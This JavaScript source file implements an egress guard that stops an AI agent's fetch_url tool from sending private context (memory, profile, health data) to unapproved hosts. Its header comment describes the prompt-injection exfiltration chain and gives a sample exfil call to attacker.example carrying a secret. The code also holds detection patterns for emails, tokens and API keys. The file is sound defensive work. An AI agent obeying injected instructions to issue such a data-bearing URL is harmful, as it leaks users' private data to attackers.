/**
 * Tool egress guard (F5-03.7) — breaks the prompt-injection exfiltration chain.
 *
 * The AIOS agent injects private context (memory, profile, health) into its
 * prompt AND can ingest untrusted content (fetch_url / web_search / browser
 * reads). The remaining exfil precondition is a sink: a `fetch_url` whose URL
 * carries that private data out to an attacker host, e.g.
 *   fetch_url("https://attacker.example/collect?d=<secret>")
 * The request itself leaks the data regardless of the response.
 *
 * This guard blocks the exfil SIGNATURE — a data-bearing query/fragment/path
 * to a non-allowlisted host — while leaving normal reads
 * (fetch_url("https://en.wikipedia.org/wiki/X")) untouched. It is intentionally
 * conservative: it flags only outbound URLs that carry a high-entropy or
 * PII-shaped payload, which legitimate page fetches essentially never do.
 *
 * This is a proportionate boundary for the CURRENT tool set, not a full
 * information-flow policy. The future model (capability-scoped egress + taint
 * tracking + per-tool approval) is documented in the F5-03 report.
 */

// Hosts the agent legitimately fetches from with query strings (search + the
// CORS proxies fetch_url itself uses). Suffix match on the registrable domain.
const EGRESS_ALLOWED_HOST_SUFFIXES = Object.freeze([
  'bing.com',
  'wikipedia.org',
  'wikimedia.org',
  'duckduckgo.com',
  'google.com',
  'corsproxy.io',
  'allorigins.win',
])

function hostAllowed(host) {
  const h = String(host || '').toLowerCase()
  return EGRESS_ALLOWED_HOST_SUFFIXES.some((s) => h === s || h.endsWith(`.${s}`))
}

/** Shannon entropy (bits/char) — high for base64/hex secret blobs, low for prose. */
function entropy(str) {
  const s = String(str || '')
  if (!s) return 0
  const freq = {}
  for (const ch of s) freq[ch] = (freq[ch] || 0) + 1
  let e = 0
  const n = s.length
  for (const k in freq) {
    const p = freq[k] / n
    e -= p * Math.log2(p)
  }
  return e
}

const PII_SHAPES = [
  /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/, // email
  /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/, // ipv4
  /eyJ[A-Za-z0-9_-]{10,}\./, // jwt-ish
  /\bsk-[A-Za-z0-9]{16,}\b/, // api key-ish
  /sb_(publishable|secret)_[A-Za-z0-9_-]{6,}/, // supabase keys
]

/**
 * Decide whether a fetch_url target is safe to request.
 * @param {string} url
 * @returns {{ allow: boolean, reason?: string }}
 */
export function evaluateEgressUrl(url) {
  let u
  try {
    u = new URL(String(url))
  } catch {
    return { allow: false, reason: 'invalid_url' }
  }
  if (!/^https?:$/.test(u.protocol)) return { allow: false, reason: 'non_http_scheme' }

  // The data-bearing surface an exfil packs a secret into.
  const carrier = `${u.search}${u.hash}`
  const carrierValue = `${u.searchParams.toString()}${u.hash}`
  const pathTail = u.pathname.split('/').pop() || ''

  const allowed = hostAllowed(u.hostname)

  // PII-shaped data anywhere in the outbound URL -> block regardless of host
  // (never legitimate to send an email/token/ip to a URL as a query value).
  const full = decodeURIComponent(`${u.pathname}${carrier}`)
  for (const re of PII_SHAPES) {
    if (re.test(full)) return { allow: false, reason: 'pii_in_url' }
  }

  if (allowed) return { allow: true }

  // Non-allowlisted host: block if it carries a high-entropy blob (secret-like)
  // in the query/fragment or a long opaque path segment.
  const longCarrier = carrierValue.length >= 24 && entropy(carrierValue) >= 3.5
  const longPathBlob = pathTail.length >= 32 && entropy(pathTail) >= 3.5
  if (longCarrier || longPathBlob) {
    return { allow: false, reason: 'high_entropy_egress_to_untrusted_host' }
  }
  return { allow: true }
}

export const EGRESS_BLOCK_MESSAGE =
  '出于安全考虑，已拦截这次外发请求：目标 URL 像是把上下文数据（密钥/邮箱/高熵串）发往未在白名单内的主机。' +
  '如果这是你本人想访问的正常网址，请去掉查询串里的数据后重试，或直接给出干净链接。'
